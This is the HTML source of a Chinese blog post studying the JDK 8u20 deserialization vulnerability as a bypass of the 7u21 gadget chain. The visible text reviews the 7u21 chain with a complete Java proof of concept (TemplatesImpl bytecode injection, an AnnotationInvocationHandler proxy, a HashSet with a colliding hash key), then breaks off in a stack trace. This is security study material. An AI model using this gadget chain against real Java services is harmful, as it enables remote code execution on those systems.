@@ -1,0 +1,972 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="7u21gadget的绕过"><title>Jdk8u20反序列化漏洞</title><link rel=canonical href=https://baozongwi.xyz/p/jdk8u20-deserialization/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="Jdk8u20反序列化漏洞"><meta property='og:description' content="7u21gadget的绕过"><meta property='og:url' content='https://baozongwi.xyz/p/jdk8u20-deserialization/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content><meta property='article:published_time' content='2025-10-10T23:37:01+08:00'><meta property='article:modified_time' content='2025-10-10T23:37:01+08:00'><meta name=twitter:title content="Jdk8u20反序列化漏洞"><meta name=twitter:description content="7u21gadget的绕过"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#回顾学习>回顾学习</a></li><li><a href=#poc>Poc</a><ol><li><a href=#poc1-报错>poc1 报错</a></li><li><a href=#poc2-报错>poc2 报错</a></li><li><a href=#最终poc>最终poc</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/javasec/>Javasec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/jdk8u20-deserialization/>Jdk8u20反序列化漏洞</a></h2><h3 class=article-subtitle>7u21gadget的绕过</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-10-10T23:37:01+08:00>Oct 10, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 124 天前，文中的内容可能已有所发展或发生改变。</span></div><p><a class=link href=https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html target=_blank rel=noopener>https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a> 先下载8u20</p><h2 id=回顾学习>回顾学习</h2><p>回顾7u21反序列化利用链</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.Jdk</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Proxy</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashSet</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>jdk7u21Unserialize</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>harmlessTemplates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>harmlessTemplates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Pwnr&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>harmlessTemplates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>hashCodeStr</span><span class=o>=</span><span class=s>&#34;f5a5a608&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>innerMap</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>innerMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>hashCodeStr</span><span class=p>,</span><span class=w> </span><span class=n>harmlessTemplates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>construct</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>construct</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>invocationHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>construct</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=n>innerMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>invocationHandler</span><span class=p>,</span><span class=w> </span><span class=s>&#34;type&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Templates</span><span class=w> </span><span class=n>proxyMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Templates</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>jdk7u21Unserialize</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>invocationHandler</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashSet</span><span class=w> </span><span class=n>set</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>HashSet</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>proxyMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>harmlessTemplates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>harmlessTemplates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>().</span><span class=na>get</span><span class=p>(</span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>Base</span><span class=p>.</span><span class=na>Evil</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>()).</span><span class=na>toBytecode</span><span class=p>()});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=o>=</span><span class=n>serialize</span><span class=p>(</span><span class=n>set</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=w> </span><span class=o>=</span><span class=n>unserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>annotation</span><span class=p>.</span><span class=na>AnnotationInvocationHandler</span><span class=p>.</span><span class=na>equalsImpl</span><span class=p>(</span><span class=n>AnnotationInvocationHandler</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>199</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>annotation</span><span class=p>.</span><span class=na>AnnotationInvocationHandler</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>AnnotationInvocationHandler</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>59</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>proxy</span><span class=p>.</span><span class=na>$Proxy0</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>Unknown</span><span class=w> </span><span class=n>Source</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>475</span><span class=p>)</span><span class=w>
